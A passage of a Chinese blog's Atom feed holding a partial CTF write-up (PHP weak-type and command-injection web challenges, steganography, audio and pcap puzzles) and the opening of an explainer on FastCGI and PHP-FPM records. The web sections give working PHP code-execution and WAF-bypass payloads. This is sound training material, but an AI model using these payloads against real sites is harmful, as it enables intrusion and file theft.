<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zoey</title>
  
  <subtitle>请多指教！</subtitle>
  <link href="http://www.yoyo2tong.xyz/atom.xml" rel="self"/>
  
  <link href="http://www.yoyo2tong.xyz/"/>
  <updated>2021-08-03T04:53:30.207Z</updated>
  <id>http://www.yoyo2tong.xyz/</id>
  
  <author>
    <name>zoey</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第四届海啸杯wp（部分）</title>
    <link href="http://www.yoyo2tong.xyz/2021/08/03/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AFwp/"/>
    <id>http://www.yoyo2tong.xyz/2021/08/03/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AFwp/</id>
    <published>2021-08-02T17:41:22.277Z</published>
    <updated>2021-08-03T04:53:30.207Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p><img src="https://i.loli.net/2021/08/03/aV9Xc3MStefW7yD.png"></p><p>首先要使$login=true，想到的是md5弱类型比较，查看str_shuffle函数的用法，是随机地打乱字符串中的所有字符。如果是md5加密绕过的话，想到的是0e开头绕过和传入数组绕过。但是str_shuffle打乱之后这两种思路都行不通。试图查看str_shuffle函数有没有漏洞，没有找到。</p><p>接下来继续观察， $unserialize_str这个函数是可控的，它与$username弱类型比较的值要为真，而$username是不可控的，查看弱类型比较还有什么可以利用的地方，发现可以利用0与字符串弱类型比较的结果也为0（这里要注意的是，第一个字符不能为数字），到这里就清楚了，md5在这里就是混淆视线的，我们可以把$username，$password视为随机值。</p><p>那么接下来要思考的是，怎样让$unserialize_str[‘username’]和$unserialize_str[‘password’]的值为0</p><p>注意到 unserialize函数，想到反序列化漏洞，但是在反序列化漏洞中没有找到可以利用的地方。</p><p>还是继续从弱类型比较入手，PHP弱类型 - 简书  <a href="https://www.jianshu.com/p/90d235d4f745">https://www.jianshu.com/p/90d235d4f745</a></p><p>在这篇文章中找到</p><p><img src="https://i.loli.net/2021/08/03/USlvKzD8F5dk4o7.png"></p><p>这里的json_decode函数让我联想到了unserialize函数，都是可以触发反序列化漏洞的函数。</p><p>这里的payload为 item={“key”:0}，尝试构造这到题的payload，没有成功。</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803123540.png"></p><p>继续找弱类型，发现这篇文章，ctf常见php弱类型分析_词语大杂烩-CSDN博客_ctf弱类型  <a href="https://blog.csdn.net/qq3401247010/article/details/77867399">https://blog.csdn.net/qq3401247010/article/details/77867399</a></p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803123647.png"></p><p>发现这道题的payload用的是数组的方法，unserialize函数在数组中不会报错。</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803123710.png"></p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803123733.png"></p><p>接着绕过正则，<a href="https://blog.csdn.net/silence1_/article/details/102835743%E5%8F%82%E8%80%83%E4%BA%86%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%EF%BC%8C%E6%9E%84%E9%80%A0payload">https://blog.csdn.net/silence1_/article/details/102835743参考了这篇文章，构造payload</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str&#x3D;a:2:&#123;s:8:%22username%22;i:0;s:8:%22password%22;i:0;&#125;&amp;code&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;var_dump(highlight_file(end(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803123834.png"></p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803123854.png"></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$dir = <span class="string">&#x27;sandbox/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>($_GET[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> $dir;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        $data = $_GET[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>$_SERVER[“REMOTE_ADDR”] 为获取’获取IP</p><p>$a ?? 0 等同于 isset($a) ? $a : 0</p><p>$a ?: 0 等同于 $a ? $a : 0</p><p>可得$_GET[“action”] ?? “” 等同于isset($attion) ? $attion : “”</p><p>我们的目的就是要让$action=’upload’,执行file_put_contents函数</p><p>$dir并不是我们能控制的，也就是file_put_contents函数打开的文件路径是固定的，这里我在本地测试的时候遇到一个问题，文件名中不能含有’/‘</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803123914.png"></p><p>既然名不能有’/‘,我一开始想到的是注释，但是行不通，然后是文件流，base64编码，但是由于$dir不是我们能控制的，所以都行不通。接着发现mkdir函数在创建文件目录或文件是也不能有’/‘等特殊符号，如何存在’/‘，’/‘前面会被当成创建文件目录处理。而这道题中刚好有有mkdir函数<code>if(!file_exists($dir))&#123; mkdir($dir);&#125;</code></p><p>只要执行mkdir函数，file_put_contents函数打开的文件路径就不会报错了。</p><p>这道题还可以通过让$action=pwd,打印出$dir,也就是file_put_contents函数打开的文件路径。</p><p>接下来考虑的是$data变量，因为file_put_contents函数打开的文件后缀为php，也就是如果$data为输入php格式，可以执行php代码。</p><p>这里 waf($data)调用了两个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,$input))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array($input))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>($input <span class="keyword">as</span> $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>isArray() 方法用于判断一个对象是否为数组。如果对象是数组返回 true，否则返回 false。我们刚才分析$data的内容应该是php文件的格式，所以不会是一个数组。观察 check方法</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803123942.png"></p><p>php被过滤，我们可以采用短标签的格式，<code>&lt;?=  ?&gt;</code></p><p>到这里一开始的想法是构造一句话木马，但是这些符号被过滤了，构造失败</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_  ^  ~  ;  &#123; &#125;</span><br></pre></td></tr></table></figure><p>然后发现反引号没有被过滤，可以构造<?= %09`dir`?></p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124031.png"></p><p>这里空格被过滤，用%09代替。</p><p>这里当前目录只有index.php,一开始的想法是通过返回上级目录查看内容，也就是<code>cd%09..&amp;&amp;ls</code>,但发现没有执行成功，最后是通过返回根目录</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124050.png"></p><p>可以看出最后xxxaf14gss.php即为我们想找的文件，cat  /xxxaf14gss.php，php被过滤，用*绕过</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124106.png"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="隐藏的书"><a href="#隐藏的书" class="headerlink" title="隐藏的书"></a>隐藏的书</h2><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210802153833.png"></p><p>用Bandzip解压成功</p><p>打开pdf是一篇隐写的论文，到这里就很清楚了，就是需要根据论文的解密方法解开flag.txt的内容</p><h4 id="隐写信息的编码"><a href="#隐写信息的编码" class="headerlink" title="隐写信息的编码"></a>隐写信息的编码</h4><p>编码算法首先应获取秘密信息每一位的 ASCII 码，之后把 ASCII 码转换为十六进制 数，最后用 Unicode 编码字符表示从 ASCII 码转换过来的十六进制数。考虑的中文 ASCII 编码的特殊性，中文一个字符占两个字节，则我们将每个字节分别转为对应 的 ASCII 码，即一个英文字符用两个不可见字符表示，而一个中文字符用四个不可 见字符表示。</p><p>隐写信息的一个英文字符用两个不可见字符表示    ASCII码 –&gt;   十六进制数  –&gt;   Unicode编码</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124134.png"></p><h4 id="隐写信息的嵌入"><a href="#隐写信息的嵌入" class="headerlink" title="隐写信息的嵌入"></a>隐写信息的嵌入</h4><p>第一步：找到’.’字符</p><p>第二步：以字符‘.’为界截成 Ca 和 Cb 两部分，并且‘.’字符在 Ca 中</p><p>第三步：Ca、不可见字符串、Cb 的顺序形成新的字符串</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124151.png"></p><p>这道题中Ca为Hello.  Cb为Gzmtu，中间为不可见字符串</p><h4 id="隐写信息的解码"><a href="#隐写信息的解码" class="headerlink" title="隐写信息的解码"></a>隐写信息的解码</h4><p>对每一个字符逆的 Unicode编码找到对应的 ASCII 编码；最后，根据 ASCII 码转换出相应的实际字符；</p><p>首先，我们可以从Unicode编码推出hex编码（16进制），再推出ASCII码。</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124206.png"></p><p>这道题的不可见字符从0606开始，到070D结束。</p><p>因为隐写信息的一个英文字符用两个不可见字符表示，也就是0606代表一个英文字母，060c代表一个英文字母，以此类推到070D。</p><p>一般的flag形式为flag{<strong>****</strong>}，也就是0606表示的是f，060c表示的是l，可以猜测，该算法的0606表示的是16进制66，转换为ASCII码是f。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">例：隐写flag </span><br><span class="line"></span><br><span class="line">f:102(ascii码）---&gt;66（十六进制）</span><br><span class="line"></span><br><span class="line">l:108(ascii码）---&gt;6c（十六进制）</span><br><span class="line"></span><br><span class="line">a:97(ascii码）----&gt;61（十六进制）</span><br><span class="line"></span><br><span class="line">g:103(ascii码）---&gt;67（十六进制）</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124223.png"></p><h2 id="神秘的铃声"><a href="#神秘的铃声" class="headerlink" title="神秘的铃声"></a>神秘的铃声</h2><h3 id="010脚本安装"><a href="#010脚本安装" class="headerlink" title="010脚本安装"></a>010脚本安装</h3><p>Templates(模板，范本)—Template Repository</p><p>选中脚本（.bt文件），使用F5运行分析，如果没有窗口，那么手动打开窗口 View—Inspector Windows—Show/Hide All Inspector Windows</p><p>参考文章：<a href="http://www.cxyzjd.com/article/iamsongyu/84674337">http://www.cxyzjd.com/article/iamsongyu/84674337</a></p><p>打开题目给的wav文件，发现有一个struct UNKNOWNCHUNK unkown模块，发现是一串base64字符串，复制到burpsuit进行解码。</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124238.png"></p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124257.png"></p><p>解码完是以PK开头的，保存为zip文件，复制到repeater模块，右键保存为zip文件。</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124313.png"></p><p>打开文件需要解码，想到WAV文件播放是一段DTMF音频，也就是电话机按键的声音</p><p>识别音频的网站：<a href="http://dialabc.com/sound/detect/index.html">http://dialabc.com/sound/detect/index.html</a></p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124330.png"></p><p>D#*C9A16B即为zip文件的密码，解压得到flag.txt是一串坐标，将其转换为图片得到二维码扫码得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">500</span>,<span class="number">500</span>),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"><span class="comment">#创建Image对象</span></span><br><span class="line">f = open(<span class="string">&#x27;flag.txt&#x27;</span>)<span class="comment">#打开flag.txt文件</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    point = line.split()</span><br><span class="line">    img.putpixel((int(point[<span class="number">0</span>]),int(point[<span class="number">1</span>])),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="comment">#读取文件中的每一行，并修改像素</span></span><br><span class="line">f.close()</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure><p>也可以安装gnuplot</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124349.png"></p><h2 id="神秘的网站"><a href="#神秘的网站" class="headerlink" title="神秘的网站"></a>神秘的网站</h2><p>扔到wireshark分析根据题目提示是一个神秘的网站，只需要找HTTP即可。hint提示了上传包那么：直接filter过滤出所有POST协议迅速就能找到上传包。（http.request.method==”POST”）</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124405.png"></p><p>追踪该HTTP流，发现有zip文件</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124421.png"></p><p>右键，导出分组字节流</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124436.png"></p><p>解压得到一个文件和一张图片</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124452.png"></p><p>看到最后是KP，想到应该是zip文件开头的PK，自然想到该文件是倒转。</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124507.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a = file_get_contents(<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line">file_put_contents(<span class="string">&quot;flag.zip&quot;</span>,strrev($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到zip文件，解压发现需要密码。</p><ul><li>图片只能看到一部分说明chunk被破坏过用010打开可以发现chunk4长度很奇怪应该被改过</li></ul><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124524.png"></p><p>将其改大可以恢复图片得到一串字符串</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124538.png"></p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124554.png"></p><p>得到的这个字符串是zip文件的密码，解压得到一个音频文件，不过该音频文件也是需要倒放，打开au，效果—反向（时间）即可。最后用网易云音乐听歌识曲，flag在评论区。</p><p><img src="https://raw.githubusercontent.com/yoyoOO123/img/main//20210803124609.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;web1&quot;&gt;&lt;a href=&quot;#web1&quot; class=&quot;headerlink&quot; title=&quot;web1&quot;&gt;&lt;/a&gt;web</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>php-fpm</title>
    <link href="http://www.yoyo2tong.xyz/2021/06/05/PHP-FPM(fastcgi%E5%8D%8F%E8%AE%AE)/"/>
    <id>http://www.yoyo2tong.xyz/2021/06/05/PHP-FPM(fastcgi%E5%8D%8F%E8%AE%AE)/</id>
    <published>2021-06-05T05:30:09.298Z</published>
    <updated>2021-06-10T06:28:53.933Z</updated>
    
    <content type="html"><![CDATA[<p>CGI,Fastcgi,PHP-FPM三者的联系</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/nep/fastcgi%E5%8D%8F%E8%AE%AE/3.png"></p><h2 id="CGI协议"><a href="#CGI协议" class="headerlink" title="CGI协议"></a>CGI协议</h2><p><strong>CGI协议</strong>是为了保证web server传递过来的数据<strong>是标准格式</strong></p><blockquote><p>web server（比如说nginx）如果请求<code>/index.html</code>，那么web server会去文件系统中找到这个文件，发送给浏览器，这里分发的是静态数据。</p><p>如果现在请求的是<code>/index.php</code>，根据配置文件，nginx知道这个不是静态文件，需要去找PHP解析器来处理，那么他会把这个请求简单处理后交给PHP解析器。</p><p>CGI就是处理这个请求的协议。</p><p>当web server收到<code>/index.php</code>这个请求后，会启动对应的CGI程序，这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程。web server再把结果返回给浏览器。</p></blockquote><h2 id="fastcgi协议"><a href="#fastcgi协议" class="headerlink" title="fastcgi协议"></a>fastcgi协议</h2><p><strong>Fastcgi是用来提高CGI程序性能的</strong>。</p><blockquote><p>“PHP解析器会解析php.ini文件，初始化执行环境”，标准的CGI对每个请求都会执行这些步骤，所以处理每个时间的时间会比较长。那么Fastcgi是怎么做的呢？首先，Fastcgi会先启一个master，解析配置文件，初始化执行环境，然后再启动多个worker。当请求过来时，master会传递给一个worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，提高了效率。而且当worker不够用时，master可以根据配置预先启动几个worker等着；当然空闲worker太多时，也会停掉一些，这样就提高了性能，也节约了资源。这就是fastcgi协议对进程的管理。</p></blockquote><h2 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h2><p><strong>PHP是一个实现了Fastcgi的程序</strong></p><blockquote><p>PHP的解释器是php-cgi。但php-cgi只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理，所以就有了PHP-FPM来管理进程，FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。</p><p>FPM按照fastcgi的协议将TCP流解析成真正的数据。</p></blockquote><h1 id="细说fastcgi协议"><a href="#细说fastcgi协议" class="headerlink" title="细说fastcgi协议"></a>细说fastcgi协议</h1><p>Fastcgi是用来沟通程序(如PHP, Python, Java)和Web服务器(Apache2, Nginx), 理论上任何语言编写的程序都可以通过Fastcgi来提供Web服务。<br>Fastcgi的特点是会在一个进程中依次完成多个请求，以达到提高效率的目的，大多数Fastcgi实现都会维护一个进程池。</p><p>Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p><p>record的头固定8个字节，body是由头中的contentLength指定，其结构如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  <span class="comment">/* Header */</span></span><br><span class="line">  unsigned char version; <span class="comment">// 版本</span></span><br><span class="line">  unsigned char type; <span class="comment">// 本次record的类型</span></span><br><span class="line">  unsigned char requestIdB1; <span class="comment">// 本次record对应的请求id</span></span><br><span class="line">  unsigned char requestIdB0;</span><br><span class="line">  unsigned char contentLengthB1; <span class="comment">// body体的大小</span></span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; <span class="comment">// 额外块大小</span></span><br><span class="line">  unsigned char reserved; </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Body */</span></span><br><span class="line">  unsigned char contentData[contentLength];</span><br><span class="line">  unsigned char paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure><p>头由8个uchar类型的变量组成，每个变量1字节。</p><h2 id="Fastcgi-Type"><a href="#Fastcgi-Type" class="headerlink" title="Fastcgi Type"></a>Fastcgi Type</h2><p>第二个字节type是record的类型，而record包含信息的内容，也就是我们可以利用的内容，下面详细介绍一下。</p><p><code>type</code>就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过<code>type</code>来标志每个record的作用，用<code>requestId</code>作为同一次请求的id。</p><p>当后端语言接收到一个<code>type</code>为4的record后，就会把这个record的body按照对应的结构解析成key-value对，这就是环境变量。环境变量的结构如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  <span class="comment">/* nameLengthB0  &gt;&gt; 7 == 0 */</span></span><br><span class="line">  unsigned char valueLengthB0; <span class="comment">/* valueLengthB0 &gt;&gt; 7 == 0 */</span></span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair11;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  <span class="comment">/* nameLengthB0  &gt;&gt; 7 == 0 */</span></span><br><span class="line">  unsigned char valueLengthB3; <span class="comment">/* valueLengthB3 &gt;&gt; 7 == 1 */</span></span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair14;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  <span class="comment">/* nameLengthB3  &gt;&gt; 7 == 1 */</span></span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB0; <span class="comment">/* valueLengthB0 &gt;&gt; 7 == 0 */</span></span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair41;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  <span class="comment">/* nameLengthB3  &gt;&gt; 7 == 1 */</span></span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB3; <span class="comment">/* valueLengthB3 &gt;&gt; 7 == 1 */</span></span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair44;</span><br></pre></td></tr></table></figure><p>这其实是4个结构，至于用哪个结构，有如下规则：</p><ol><li>key、value均小于128字节，用<code>FCGI_NameValuePair11</code></li><li>key大于128字节，value小于128字节，用<code>FCGI_NameValuePair41</code></li><li>key小于128字节，value大于128字节，用<code>FCGI_NameValuePair14</code></li><li>key、value均大于128字节，用<code>FCGI_NameValuePair44</code></li></ol><h2 id="FPM解析数据"><a href="#FPM解析数据" class="headerlink" title="FPM解析数据"></a>FPM解析数据</h2><p>FPM按照fastcgi的协议将TCP流解析成真正的数据。</p><p>举个例子，用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是<code>/var/www/html</code>，那么Nginx会将这个请求变成如下key-value对：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: <span class="string">&#x27;/var/www/html/index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: <span class="string">&#x27;/index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;?a=1&amp;b=2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>: <span class="string">&#x27;/index.php?a=1&amp;b=2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: <span class="string">&#x27;/var/www/html&#x27;</span>,</span><br><span class="line">    <span 